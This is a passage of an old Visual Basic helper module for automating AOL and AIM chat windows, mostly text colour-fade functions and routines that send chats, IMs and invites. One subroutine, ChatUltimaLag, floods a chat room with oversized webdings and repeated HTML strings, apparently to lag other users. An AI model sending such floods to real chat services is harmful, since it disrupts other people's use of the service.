        colorx = RGB(((B3 - B2) / TextLen% * I) + B2, ((G3 - G2) / TextLen% * I) + G2, ((R3 - R2) / TextLen% * I) + R2)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part3
    TextLen% = Len(part3$)
    For I = 1 To TextLen%
        TextDone$ = Left(part3$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / TextLen% * I) + B3, ((G4 - G3) / TextLen% * I) + G3, ((R4 - R3) / TextLen% * I) + R3)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part4
    TextLen% = Len(part4$)
    For I = 1 To TextLen%
        TextDone$ = Left(part4$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - B4) / TextLen% * I) + B4, ((G5 - G4) / TextLen% * I) + G4, ((R5 - R4) / TextLen% * I) + R4)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part5
    TextLen% = Len(part5$)
    For I = 1 To TextLen%
        TextDone$ = Left(part5$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / TextLen% * I) + B5, ((G6 - G5) / TextLen% * I) + G5, ((R6 - R5) / TextLen% * I) + R5)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part6
    TextLen% = Len(part6$)
    For I = 1 To TextLen%
        TextDone$ = Left(part6$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b7 - B6) / TextLen% * I) + B6, ((g7 - G6) / TextLen% * I) + G6, ((r7 - R6) / TextLen% * I) + R6)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded6$ = Faded6$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part7
    TextLen% = Len(part7$)
    For I = 1 To TextLen%
        TextDone$ = Left(part7$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b8 - b7) / TextLen% * I) + b7, ((g8 - g7) / TextLen% * I) + g7, ((r8 - r7) / TextLen% * I) + r7)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded7$ = Faded7$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part8
    TextLen% = Len(part8$)
    For I = 1 To TextLen%
        TextDone$ = Left(part8$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B9 - b8) / TextLen% * I) + b8, ((G9 - g8) / TextLen% * I) + g8, ((R9 - r8) / TextLen% * I) + r8)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded8$ = Faded8$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part9
    TextLen% = Len(part9$)
    For I = 1 To TextLen%
        TextDone$ = Left(part9$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B10 - B9) / TextLen% * I) + B9, ((G10 - G9) / TextLen% * I) + G9, ((R10 - R9) / TextLen% * I) + R9)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded9$ = Faded9$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    FadeTenColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + Faded6$ + Faded7$ + Faded8$ + Faded9$
End Function
Function InverseColor(OldColor)
'by monk-e-god
dacolor$ = RGBtoHEX(OldColor)
redx% = val("&H" + Right(dacolor$, 2))
greenx% = val("&H" + Mid(dacolor$, 3, 2))
bluex% = val("&H" + Left(dacolor$, 2))
newred% = 255 - redx%
newgreen% = 255 - greenx%
newblue% = 255 - bluex%
InverseColor = RGB(newred%, newgreen%, newblue%)
End Function
Function HTMLtoRGB(TheHTML$)
'by monk-e-god
'converts HTML such as 0000FF to an
'RGB value like &HFF0000 so you can
'use it in the FadeByColor functions
If Left(TheHTML$, 1) = "#" Then TheHTML$ = Right(TheHTML$, 6)
redx$ = Left(TheHTML$, 2)
greenx$ = Mid(TheHTML$, 3, 2)
bluex$ = Right(TheHTML$, 2)
rgbhex$ = "&H00" + bluex$ + greenx$ + redx$ + "&"
HTMLtoRGB = val(rgbhex$)
End Function
Function FadeFourColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, thetext$, WavY As Boolean)
'by monk-e-god
    TextLen% = Len(thetext)
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Right(thetext, thrdlen%)
    'part1
    TextLen% = Len(part1$)
    For I = 1 To TextLen%
        TextDone$ = Left(part1$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / TextLen% * I) + B1, ((G2 - G1) / TextLen% * I) + G1, ((R2 - R1) / TextLen% * I) + R1)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part2
    TextLen% = Len(part2$)
    For I = 1 To TextLen%
        TextDone$ = Left(part2$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / TextLen% * I) + B2, ((G3 - G2) / TextLen% * I) + G2, ((R3 - R2) / TextLen% * I) + R2)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part3
    TextLen% = Len(part3$)
    For I = 1 To TextLen%
        TextDone$ = Left(part3$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / TextLen% * I) + B3, ((G4 - G3) / TextLen% * I) + G3, ((R4 - R3) / TextLen% * I) + R3)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    FadeFourColor = Faded1$ + Faded2$ + Faded3$
End Function
Function FadeThreeColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, thetext$, WavY As Boolean)
'by monk-e-god
    TextLen% = Len(thetext)
    fstlen% = (Int(TextLen%) / 2)
    part1$ = Left(thetext, fstlen%)
    part2$ = Right(thetext, TextLen% - fstlen%)
    'part1
    TextLen% = Len(part1$)
    For I = 1 To TextLen%
        TextDone$ = Left(part1$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / TextLen% * I) + B1, ((G2 - G1) / TextLen% * I) + G1, ((R2 - R1) / TextLen% * I) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part2
    TextLen% = Len(part2$)
    For I = 1 To TextLen%
        TextDone$ = Left(part2$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / TextLen% * I) + B2, ((G3 - G2) / TextLen% * I) + G2, ((R3 - R2) / TextLen% * I) + R2)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    FadeThreeColor = Faded1$ + Faded2$
End Function
Function FadeTwoColor(R1%, G1%, B1%, R2%, G2%, B2%, thetext$, WavY As Boolean)
'by monk-e-god
    TextLen$ = Len(thetext)
    For I = 1 To TextLen$
        TextDone$ = Left(thetext, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / TextLen$ * I) + B1, ((G2 - G1) / TextLen$ * I) + G1, ((R2 - R1) / TextLen$ * I) + R1)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded$ = Faded$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    FadeTwoColor = Faded$
End Function
Function ErrorBox()
'Returns the handle of the error box that comes up on aol4
'when you try to email someone who has a full mailbox or
'something similar.
ErrorBox = FindChildByTitle(AOLMDI, "Error")
End Function
Function ErrorView()
'Returns the handle of the _AOL_View that comes up with the
'error box.
ErrorView = FindChildByClass(AOL40ErrorBox, "_AOL_View")
End Function
Sub MailWait(Handle As Long)
'This waits until the mail is loaded
Dim Check1 As Long
Dim Check2 As Long
Dim Check As Long
Check = FindChildByClass(Handle, "RICHCNTL")
NoUpDate Check
If Check = 0 Then Exit Sub
Do
DoEvents
Check1 = SendMessage(Check, WM_GETTEXTLENGTH, 0, 0)
Pause 1
Check2 = SendMessage(Check, WM_GETTEXTLENGTH, 0, 0)
Loop Until Check1 = Check2
End Sub
Function ConvertAsciiToVirtualKey(AsciiChar As String) As Integer
'Converts a ascii code to a virtual key code.
Dim Ret As Long, HoldByte As Byte
    If Len(AsciiChar) > 1 Or Len(AsciiChar) = 0 Then
        ConvertAsciiToVirtualKey = ""
        Exit Function
    End If
    HoldByte = CByte(Asc(AsciiChar))
    Ret = VkKeyScan(HoldByte) And &HFF
    ConvertAsciiToVirtualKey = Ret
End Function
Function TrimCharacter(stringer As String, CharacterToRemove As String) As String
'Removes characters from a string.
Dim Check As Integer
Do
Check = InStr(1, stringer, CharacterToRemove)
If Check > 0 Then
    stringer = Left(stringer, Check - 1) & Right(stringer, Len(stringer) - Check)
End If
Loop Until Check = 0
TrimCharacter = stringer
End Function
Sub NoUpDate(Handle As Long)
'This locks a window from being updated. Only one window may
'be locked at one time. To unlock a locked window, do
'this: NoUpDate(0). This can be used to make tracking
'rectangles.
LockWindowUpdate (Handle)
End Sub
Function ReplaceCharacters(Text, charfind, charchange)
hek = InStr(Text, charfind)
If hek = 0 Then
ReplaceCharacters = Text
Exit Function
End If
z = 0
phrig$ = Text
Do
z = z + 1
newz = InStr(z, phrig$, charfind)
If newz = 0 Then GoTo imcool
F = newz - z
ar$ = Left$(phrig$, F)
ee$ = Mid$(phrig$, F + Len(charfind) + 1)
z = newz + 1
phrig$ = ar$ + charchange + ee$
Loop
imcool:
thechars$ = phrig$
ReplaceCharacters = thechars$
End Function
Function CountSelected(Lst As ListBox)
CountSelected = Lst.SelCount
End Function
Function SearchForSelected(Lst As ListBox)
If Lst.List(0) = "" Then
counterf = 0
GoTo last
End If
counterf = -1
Start:
counterf = counterf + 1
If Lst.ListCount = counterf + 1 Then GoTo last
If Lst.Selected(counterf) = True Then GoTo last
If couterf = Lst.ListCount Then GoTo last
GoTo Start
last:
SearchForSelected = counterf
End Function
Function AOLGetTopWindow()
AOLGetTopWindow = GetTopWindow(AOLMDI())
End Function
Sub ChatUltimaLag()
ChatSend "<font face=webdings>" & FadeFiveColor(RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), "gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg", False)
Pause 1
ChatSend "<font face=webdings>" & FadeFiveColor(RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), "gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg", False)
Pause 1
ChatSend "<font face=webdings>" & FadeFiveColor(RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), "gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg", False)
Pause 1
ChatSend "<font face=webdings>" & FadeFiveColor(RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), RandomNumber(255), "gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg", False)
Pause 1
ChatSend "<html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html>"
Pause 1
ChatSend "<html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html>"
Pause 1
ChatSend "<html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html>"
Pause 1
ChatSend "<html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html><html>!</html>"
Pause 1
End Sub
Function AIMSendChat(message$)
Dim chat As Long, box As Long, Box2 As Long, Box3 As Long, Send As Long, send2 As Long, send3 As Long, send4 As Long
chat& = FindWindow("AIM_ChatWnd", vbNullString)
box& = FindWindowEx(chat&, 0&, "WndAte32Class", vbNullString)
Box2& = FindWindowEx(chat&, box&, "WndAte32Class", vbNullString)
Box3& = SendMessageByString(Box2&, WM_SETTEXT, 0, message$)
Send& = FindWindowEx(chat&, 0&, "_Oscar_IconBtn", vbNullString)
send2& = FindWindowEx(chat&, Send&, "_Oscar_IconBtn", vbNullString)
send3& = FindWindowEx(chat&, send2&, "_Oscar_IconBtn", vbNullString)
send4& = FindWindowEx(chat&, send3&, "_Oscar_IconBtn", vbNullString)
ClickIcon (send4&)
End Function
Function AIMSendIM(who$, message$)
Dim aim As Long, Group As Long, Button As Long, im As Long, IMcombo As Long, IMto As Long, IMmessage As Long, Send As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
Group& = FindWindowEx(aim&, 0&, "_Oscar_TabGroup", vbNullString)
Button& = FindWindowEx(Group&, 0&, "_Oscar_IconBtn", vbNullString)
ClickIcon (Button&)
im& = FindWindow("AIM_IMessage", vbNullString)
IMcombo& = FindWindowEx(im&, 0&, "_Oscar_PersistantCombo", vbNullString)
IMto& = FindWindowEx(IMcombo&, 0&, "Edit", vbNullString)
Call SendMessageByString(IMto&, WM_SETTEXT, 0, who$)
IMmessage& = FindWindowEx(im&, 0&, "WndAte32Class", vbNullString)
IMmessage& = GetWindow(IMmessage&, 2)
Call SendMessageByString(IMmessage&, WM_SETTEXT, 0, message$)
Send& = FindWindowEx(im&, 0&, "_Oscar_IconBtn", vbNullString)
ClickIcon (Send&)
End Function
Function AIMSendInvite(who$, message$, chat$)
Dim aim As Long, Group As Long, Button As Long, Button2 As Long, Invite As Long, Edit1 As Long, Edit2 As Long, Edit3 As Long, Send As Long, send2 As Long, send3 As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
Group& = FindWindowEx(aim&, 0&, "_Oscar_TabGroup", vbNullString)
Button& = FindWindowEx(Group&, 0&, "_Oscar_IconBtn", vbNullString)
Button2& = FindWindowEx(Group&, Button&, "_Oscar_IconBtn", vbNullString)
ClickIcon (Button2&)
Invite& = FindWindow("AIM_ChatInviteSendWnd", vbNullString)
Edit1& = FindWindowEx(Invite&, 0&, "Edit", vbNullString)
Call SendMessageByString(Edit1&, WM_SETTEXT, 0, who$)
Edit2& = FindWindowEx(Invite&, Edit1&, "Edit", vbNullString)
Call SendMessageByString(Edit2&, WM_SETTEXT, 0, message$)
Edit3& = FindWindowEx(Invite&, Edit2&, "Edit", vbNullString)
Call SendMessageByString(Edit3&, WM_SETTEXT, 0, chat$)
Send& = FindWindowEx(Invite&, 0&, "_Oscar_IconBtn", vbNullString)
send2& = FindWindowEx(Invite&, Send&, "_Oscar_IconBtn", vbNullString)
send3& = FindWindowEx(Invite&, send2&, "_Oscar_IconBtn", vbNullString)
ClickIcon (send3&)
End Function
Function AimOnline() As Boolean
Dim aim As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
If aim& = 0 Then
AimOnline = False
Else
AimOnline = True
End If
End Function
Function AIMFindChatRoom()
Dim chat As Long
chat& = FindWindow("AIM_ChatWnd", vbNullString)
AIMFindChatRoom = chat&
End Function
Function AimRoomCount() As String
If AIMFindChatRoom = 0 Then Exit Function
X = FindChildByClass(AIMFindChatRoom, "_Oscar_Static")
AimRoomCount$ = ExtractNumbersFromString(GetText(X))
End Function
Function AIMClearChat()
Dim chat As Long, box As Long
chat& = FindWindow("AIM_ChatWnd", vbNullString)
box& = FindWindowEx(chat&, 0&, "WndAte32Class", vbNullString)
Call SendMessageByString(box&, WM_SETTEXT, 0, "")
End Function
Function AIMGetChatText() As String
'whack ass, gets html also
Dim chat As Long, box As Long
chat& = FindWindow("AIM_ChatWnd", vbNullString)
box& = FindWindowEx(chat&, 0&, "WndAte32Class", vbNullString)
AIMGetChatText$ = GetText(box&)
End Function
Function AIMGetChatName()
Dim chat As Long
On Error Resume Next
chat& = FindWindow("AIM_ChatWnd", vbNullString)
RoomName$ = GetCaption(chat&)
Room$ = Mid(RoomName$, InStr(RoomName$, ":") + 2)
AIMGetChatName = Room$
End Function
Function AIMGoToWebPage(page$)
Dim aim As Long, box As Long, Go As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
box& = FindWindowEx(aim&, 0&, "Edit", vbNullString)
Call SendMessageByString(box&, WM_SETTEXT, 0, page$)
Go& = FindWindowEx(aim&, 0&, "_Oscar_IconBtn", vbNullString)
ClickIcon (Go&)
End Function
Function AIMUserSN()
Dim aim As Long
On Error Resume Next
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
name$ = GetCaption(aim&)
If InStr(name$, "Buddy List") <> 0 Then
Text% = GetWindowTextLength(aim&)
Text% = (Text%) - 14
SN$ = Left$(name$, InStr(name$, "" + name$ + "") + Text%)
AIMUserSN = SN$
Else
AIMUserSN = "(Unknown)"
End If
End Function
Function AIMSendLink(Link$, message$)
AIMSendChat "<a href=""" + Link$ + """>" + message$ + ""
End Function
Function AIMSNfromIM()
'gets the SN of the sender of an IM
'won't work if you've changed the IM caption!
Dim im As Long
On Error Resume Next
im& = FindWindow("AIM_IMessage", vbNullString)
name$ = GetCaption(im&)
If InStr(name$, "- Instant Message") <> 0 Then
Text% = GetWindowTextLength(im&)
Text% = (Text%) - 19
SN$ = Left$(name$, InStr(name$, "" + name$ + "") + Text%)
AIMSNfromIM = SN$
Else
AIMSNfromIM = "(Unknown)"
End If
End Function
Function AIMEnterRoom(chat$)
Dim aim As Long, Group As Long, Button As Long, Button2 As Long, Invite As Long, Edit1 As Long, Edit2 As Long, Edit3 As Long, Send As Long, send2 As Long, send3 As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
Group& = FindWindowEx(aim&, 0&, "_Oscar_TabGroup", vbNullString)
Button& = FindWindowEx(Group&, 0&, "_Oscar_IconBtn", vbNullString)
Button2& = FindWindowEx(Group&, Button&, "_Oscar_IconBtn", vbNullString)
ClickIcon (Button2&)
Invite& = FindWindow("AIM_ChatInviteSendWnd", vbNullString)
Edit1& = FindWindowEx(Invite&, 0&, "Edit", vbNullString)
Call SendMessageByString(Edit1&, WM_SETTEXT, 0, AIMUserSN)
Edit2& = FindWindowEx(Invite&, Edit1&, "Edit", vbNullString)
Call SendMessageByString(Edit2&, WM_SETTEXT, 0, "")
Edit3& = FindWindowEx(Invite&, Edit2&, "Edit", vbNullString)
Call SendMessageByString(Edit3&, WM_SETTEXT, 0, chat$)
Send& = FindWindowEx(Invite&, 0&, "_Oscar_IconBtn", vbNullString)
send2& = FindWindowEx(Invite&, Send&, "_Oscar_IconBtn", vbNullString)
send3& = FindWindowEx(Invite&, send2&, "_Oscar_IconBtn", vbNullString)
ClickIcon (send3&)
End Function
Function AIMGetInfo(who As String) As String
'KINDA MESSED UP
Call RunMenuByString(FindWindow("_Oscar_BuddyListWin", vbNullString), "Get Member Inf&o")
Do: DoEvents
CIO1% = FindWindow("_Oscar_Locate", vbNullString)
Loop Until CIO1% <> 0
NF1% = FindChildByClass(CIO1%, "_Oscar_PersistantComb")
NF2% = FindChildByClass(NF1%, "Edit")
NF3% = SendMessageByString(NF2%, WM_SETTEXT, 0, who)
NF4% = FindChildByClass(CIO1%, "Button")
ClickIcon (NF4%): ClickIcon (NF4%)
ourparent& = FindWindow("_Oscar_Locate", "Buddy Info: ")
OurHandle% = FindWindowEx(ourparent&, 0, "Button", vbNullString)
Call PostMessage(OurHandle%, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OurHandle%, WM_KEYUP, VK_SPACE, 0&)
Do: DoEvents
parhand1& = FindWindow("_Oscar_Locate", "Buddy Info: " & who)
ourparent& = FindWindowEx(parhand1&, 0, "WndAte32Class", vbNullString)
OurHandle2& = FindWindowEx(ourparent&, 0, "Ate32Class", vbNullString)
Loop Until OurHandle2& <> 0&
Pause 2
AIMGetInfo$ = ReplaceCharacters(GetText(OurHandle2&), "<HTML>", "")
AIMGetInfo$ = ReplaceCharacters(AIMGetInfo$, "</HTML>", "")
AIMGetInfo$ = ReplaceCharacters(AIMGetInfo$, "</FONT>", "")
AIMGetInfo$ = ReplaceCharacters(AIMGetInfo$, "<B>", "")
